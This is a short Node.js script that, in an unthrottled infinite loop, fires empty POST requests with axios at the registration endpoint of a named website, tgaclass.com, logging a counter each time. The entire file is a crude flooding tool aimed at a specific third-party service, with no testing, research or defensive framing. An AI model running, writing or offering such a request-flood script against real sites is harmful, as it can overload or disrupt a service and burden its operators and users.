const axios = require("axios")
let i = 0
while (true) {
    console.log("Port is open ", i++)
    axios.post("https://tgaclass.com/api/v1/auth/register", {}).then(r => {
        console.log("Port done ", r)
    })
}